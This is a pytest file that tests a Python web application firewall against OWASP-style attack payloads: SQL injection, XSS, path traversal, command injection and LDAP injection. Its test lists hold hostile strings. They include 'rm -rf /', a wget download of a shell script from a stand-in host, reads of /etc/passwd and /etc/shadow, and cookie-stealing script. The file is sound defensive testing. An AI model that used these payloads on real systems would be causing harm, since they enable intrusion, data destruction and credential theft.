"""
PyWAF Attack Payload Test Vectors

Comprehensive parametrized tests based on OWASP payload lists.
Verifies each known malicious payload triggers detection.
"""
import pytest
import sys
import os

sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

from waf.engine import WAFEngine
from waf.rules import get_rules


@pytest.fixture
def engine():
    """Create a WAF engine with paranoid sensitivity for maximum coverage."""
    rules = get_rules(sensitivity='paranoid')
    return WAFEngine(rules=rules, sensitivity='paranoid')


# ============================================================
# SQL Injection Payloads (OWASP)
# ============================================================
SQL_INJECTION_PAYLOADS = [
    "' OR 1=1 --",
    "' OR '1'='1",
    "admin' --",
    "1; DROP TABLE users",
    "1 UNION SELECT username, password FROM users",
    "1 exec sp_executesql",
    "1 and 1=1",
    "1' and '1'='1",
    "admin' #",
    "' OR 1=1#",
    "'; WAITFOR DELAY '0:0:5'--",
    "SELECT * FROM users WHERE id=1",
    "UNION ALL SELECT NULL, NULL, NULL",
    "admin' OR 1=1 /*",
    "1' ORDER BY 1--+",
]

@pytest.mark.parametrize("payload", SQL_INJECTION_PAYLOADS)
def test_sqli_payloads(engine, payload):
    """Every SQL injection payload must be detected."""
    result = engine.inspect(payload, source='test')
    assert result is not None, f"SQLi payload not detected: {payload}"
    assert result.threat_type == 'SQL_INJECTION', f"Wrong type for {payload}: {result.threat_type}"


# ============================================================
# XSS Payloads (OWASP)
# ============================================================
XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "javascript:void(0)",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "javascript:alert(document.cookie)",
    "\"><script>alert(1)</script>",
    "'><script>alert(1)</script>",
    "<body onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "<input autofocus onfocus=alert(1)>",
    "<a href=\"javascript:alert(1)\">Click me</a>",
    "<div onmouseover=\"alert(1)\">Hover me</div>",
    "<object data=\"javascript:alert(1)\">",
    "<embed src=\"javascript:alert(1)\">",
    "eval('alert(1)')",
]

@pytest.mark.parametrize("payload", XSS_PAYLOADS)
def test_xss_payloads(engine, payload):
    """Every XSS payload must be detected."""
    result = engine.inspect(payload, source='test')
    assert result is not None, f"XSS payload not detected: {payload}"
    assert result.threat_type == 'XSS_ATTACK', f"Wrong type for {payload}: {result.threat_type}"


# ============================================================
# Path Traversal Payloads
# ============================================================
PATH_TRAVERSAL_PAYLOADS = [
    "../../etc/passwd",
    "..\\..\\windows\\win.ini",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "/var/www/../../etc/shadow",
    "....//....//etc/passwd",
    "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd",
    "/../../../../../../../../../../etc/passwd",
]

@pytest.mark.parametrize("payload", PATH_TRAVERSAL_PAYLOADS)
def test_path_traversal_payloads(engine, payload):
    """Every path traversal payload must be detected."""
    result = engine.inspect(payload, source='test')
    assert result is not None, f"Path traversal not detected: {payload}"
    assert result.threat_type == 'PATH_TRAVERSAL', f"Wrong type for {payload}: {result.threat_type}"


# ============================================================
# Command Injection Payloads
# ============================================================
COMMAND_INJECTION_PAYLOADS = [
    "`ls -la`",
    "$(whoami)",
    "; rm -rf /",
    "&& id",
    "|| whoami",
    "; wget http://malicious.com/shell.sh",
    "$(touch /tmp/pwned)",
    "`cat /etc/hostname`",
]

@pytest.mark.parametrize("payload", COMMAND_INJECTION_PAYLOADS)
def test_cmd_injection_payloads(engine, payload):
    """Every command injection payload must be detected."""
    result = engine.inspect(payload, source='test')
    assert result is not None, f"Command injection not detected: {payload}"
    assert result.threat_type == 'COMMAND_INJECTION', f"Wrong type for {payload}: {result.threat_type}"


# ============================================================
# All Attack Payloads Must Be Blocked (Any Type)
# ============================================================
ALL_MALICIOUS = [
    "' OR 1=1 --",
    "<script>alert(1)</script>",
    "../../etc/passwd",
    "`whoami`",
    ")(|(cn=*))",
    "| cat /etc/passwd",  # Could match PATH_TRAVERSAL or COMMAND_INJECTION
]

@pytest.mark.parametrize("payload", ALL_MALICIOUS)
def test_all_malicious_detected(engine, payload):
    """Every malicious payload must be detected as SOME threat type."""
    result = engine.inspect(payload, source='test')
    assert result is not None, f"Malicious payload not detected at all: {payload}"
